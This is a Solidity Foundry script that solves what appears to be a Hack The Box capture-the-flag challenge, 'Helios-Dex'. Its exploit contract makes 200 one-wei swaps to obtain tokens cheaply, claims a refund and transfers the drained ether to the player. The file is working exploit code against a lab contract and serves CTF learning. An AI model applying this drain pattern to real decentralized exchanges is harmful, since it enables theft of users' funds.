pragma solidity ^0.8.20;

import {Script,console} from "forge-std/Script.sol";
import {Setup,HeliosDEX} from "src/HTB-CyberApocalypse-2025/Helios-Dex/Setup.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Solve is Script{
    function run()public{
        vm.startBroadcast();
        address _player=0x915f794B36Fd328D362445e3BD66ae4f3A894389;
        Setup setup=Setup(address(0x5FbDB2315678afecb367f032d93F642f64180aa3));
        HeliosDEX _heliosdex=setup.TARGET();
        Exploit exploit=new Exploit();
        exploit.pwn{value:200}(_heliosdex, _player);
        require(setup.isSolved());
        vm.stopBroadcast();
    }
}


contract Exploit{

    function pwn(HeliosDEX _helios,address _player)public payable{
        ERC20 _hls;
        _hls=_helios.heliosLuminaShards();
        for(uint8 i=0;i<200;i++){
            _helios.swapForHLS{value: 1}();
        }
        _hls.approve(address(_helios),200);
        _helios.oneTimeRefund(address(_hls), 200);
        payable(_player).transfer(address(this).balance);
    }

    receive()external payable{}
}